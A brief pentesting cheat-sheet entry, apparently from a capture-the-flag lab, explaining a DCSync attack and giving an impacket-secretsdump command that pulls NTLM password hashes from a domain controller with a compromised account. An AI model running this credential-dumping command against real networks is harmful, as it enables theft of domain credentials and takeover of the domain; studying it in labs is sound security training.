DCSync
Try this against the DC after you've compromised an account, espectially if you cannot smb or winrm into DC

```
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223
```

